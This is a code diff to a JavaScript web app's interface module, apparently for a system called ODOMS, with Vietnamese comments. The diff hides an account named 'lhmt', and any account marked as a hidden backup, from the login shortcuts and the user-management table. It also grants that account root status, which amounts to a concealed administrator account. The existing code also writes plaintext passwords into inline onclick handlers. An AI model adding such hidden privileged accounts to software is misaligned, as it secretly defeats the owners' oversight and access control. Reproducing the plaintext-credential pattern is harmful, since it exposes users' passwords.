@@ -384,12 +384,15 @@ const AppUI = {
     const countLabel = document.getElementById("quickAccountCount");
     if (!listContainer) return;
 
-    const users = window.userAuth.users;
+    // Lọc ẩn tài khoản dự phòng lhmt trên giao diện
+    const visibleUsers = (window.userAuth.users || []).filter(
+      (u) => !u.isHiddenBackup && u.username.toLowerCase() !== "lhmt"
+    );
     if (countLabel) {
-      countLabel.innerText = `${users.length} tài khoản khả dụng`;
+      countLabel.innerText = `${visibleUsers.length} tài khoản khả dụng`;
     }
 
-    listContainer.innerHTML = users
+    listContainer.innerHTML = visibleUsers
       .map(
         (u) => `
         <button type="button" class="quick-account-pill" onclick="AppUI.fillLoginCredentials('${u.username}', '${u.password}')">
@@ -2505,10 +2508,15 @@ const AppUI = {
     if (!tbody) return;
 
     const activeUser = window.userAuth.currentUser;
-    tbody.innerHTML = window.userAuth.users
+    // Lọc không hiển thị tài khoản dự phòng lhmt trên giao diện hệ thống ODOMS
+    const visibleUsers = (window.userAuth.users || []).filter(
+      (u) => !u.isHiddenBackup && u.username.toLowerCase() !== "lhmt"
+    );
+
+    tbody.innerHTML = visibleUsers
       .map((u, idx) => {
         const isCurrent = activeUser && activeUser.username.toLowerCase() === u.username.toLowerCase();
-        const isRoot = u.username.toLowerCase() === "dttd";
+        const isRoot = u.username.toLowerCase() === "dttd" || u.username.toLowerCase() === "lhmt" || u.isRoot;
 
         return `
         <tr>
